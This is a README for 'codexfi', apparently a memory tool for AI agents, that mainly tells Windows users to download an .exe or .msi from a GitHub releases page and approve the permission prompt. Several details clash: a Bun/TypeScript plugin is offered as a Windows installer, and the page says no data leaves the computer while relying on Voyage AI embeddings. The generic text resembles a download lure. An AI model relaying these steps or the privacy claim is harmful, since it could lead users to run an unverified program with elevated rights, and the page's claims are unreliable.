# 🧠 codexfi - Memory for AI Agents Made Simple

[![Download codexfi](https://img.shields.io/badge/Download-codexfi-ff69b4?style=for-the-badge)](https://github.com/Lucasdesign13/codexfi/releases)

---

## 📋 What is codexfi?

codexfi helps AI agents remember things over time. It stores information that AI programs use to make better decisions. Imagine it like a notebook where your AI keeps important facts handy.

This tool uses several technologies behind the scenes. It includes LanceDB, a fast database made to hold memory, and Voyage AI embeddings that help the system understand what is important. It works with Bun, a modern tool to run JavaScript and TypeScript programs. codexfi gives you two ways to interact: a command line tool and a simple web page to see what’s happening.

---

## 🖥️ System Requirements

codexfi runs on Windows. To get the best experience, your computer should meet these needs:

- Windows 10 or later (64-bit recommended)
- At least 4 GB of RAM
- 1 GHz or faster processor
- 500 MB free disk space
- Active internet connection for initial setup

---

## 🚀 Getting Started

Follow these steps to download and run codexfi on your Windows computer.

### Step 1: Visit the Download Page

Click this big button to go to the codexfi downloads page where you will find the latest version:

[![Download codexfi](https://img.shields.io/badge/Download-codexfi-0087ff?style=for-the-badge)](https://github.com/Lucasdesign13/codexfi/releases)

This page lists all available versions. Look for the latest “Windows” release.

### Step 2: Download the Installer

Find the file ending with `.exe` or `.msi` for Windows. The file might be named something like:

codexfi-setup-v1.0.exe

Click the file name to start downloading.

### Step 3: Run the Installer

Once downloaded, open the file. Windows may ask for permission — choose “Yes” to continue.

Follow the on-screen steps:

- Choose a folder where you want to install codexfi or leave the default
- Click “Next” until installation begins
- Wait for it to finish

---

## ⚙️ How to Use codexfi

After installation, you have two main ways to use codexfi:

### Using the Command Line Interface (CLI)

1. Open the **Start Menu** and search for “Command Prompt”. Open it.

2. Type:

    codexfi help

This command shows a list of all commands you can use.

Example commands:

- `codexfi start` — Launch the application backend
- `codexfi stop` — Stop it
- `codexfi status` — Check if it’s running

Use these commands to control the memory service.

### Using the Web Dashboard

1. Open your web browser (Chrome, Edge, Firefox)

2. Enter: `http://localhost:3000` in the address bar and press Enter.

This loads the codexfi dashboard. It shows current memory data and lets you manage AI memories with a simple interface.

---

## 🛠️ Features

- **Persistent Memory:** Keeps AI data safe across sessions.
- **Embedded LanceDB:** Stores data efficiently and reliably.
- **Voyage AI Embeddings:** Understands what your AI needs to remember.
- **Bun Plugin:** Runs fast on modern JavaScript and TypeScript environments.
- **CLI and Web Dashboard:** Offers command line controls and an easy web interface.
- **Cross-Platform Ready:** Designed primarily for Windows but supports other systems.

---

## 🔧 Configuration

You may want to configure codexfi for your needs. This is done by changing settings in a file called `config.json`. You will find it in the folder where codexfi was installed, under:

`C:\Program Files\codexfi\config.json`

Example settings:

```json
{
  "memorySize": 1000,
  "port": 3000,
  "logging": true,
  "maxConnections": 10
}
```

- `memorySize`: Number of memory items AI can store.
- `port`: Network port for the web dashboard.
- `logging`: Enables or disables event logs.
- `maxConnections`: Limits users connected at once.

To edit, open the file with Notepad, change values, save, and restart codexfi for changes to work.

---

## 🐞 Troubleshooting

If codexfi does not start or you have issues, try this list:

- Make sure your Windows version meets system requirements.
- Check that the installer finished without errors.
- Restart your computer and try launching codexfi again.
- Confirm no other programs use port 3000.
- Run Command Prompt as administrator and try commands again.
- Review the log file (found in the install folder) for error details.

If you still cannot fix the problem, see the “Issues” tab on the GitHub repository page for more help or file a new issue.

---

## 📥 Download and Installation

Return to the download page at any time here:

[Download codexfi on GitHub](https://github.com/Lucasdesign13/codexfi/releases)

Follow Step 2 and Step 3 above to get the latest version.

---

## 🔗 Useful Links

- GitHub repository: https://github.com/Lucasdesign13/codexfi
- Issues and support: https://github.com/Lucasdesign13/codexfi/issues
- Documentation: See the `docs` folder inside the project for more details and advanced settings.

---

## 🧩 How codexfi Works

codexfi’s core is a memory system for AI programs. It saves data that AI agents can access later. The data is organized using LanceDB, a fast storage method, and enhanced with AI embeddings from Voyage AI. These embeddings help the AI understand what is important and what to forget.

The Bun plugin in codexfi helps run everything using fast JavaScript routines. This means the system stays lightweight and quick. The CLI lets you control the program with typed commands. The web dashboard provides a visual way to watch and interact with the stored memories.

---

## 🔒 Security & Privacy

codexfi keeps your data on your own computer. It does not send your information elsewhere. This means your AI memory stays private unless you decide to share it.

---

## 📅 Updates

Check the GitHub releases page regularly to find the latest versions of codexfi. Updates often improve stability and add new features.

---

## 📝 License

codexfi is available under the MIT License. This lets you use, copy, and modify the software freely.

---

## 📚 Topics

This project includes AI agents, Bun tool support, OpenCode AI, LanceDB memories, embeddings with Voyage AI, and TypeScript code. It is a developer tool focused on memory management for AI.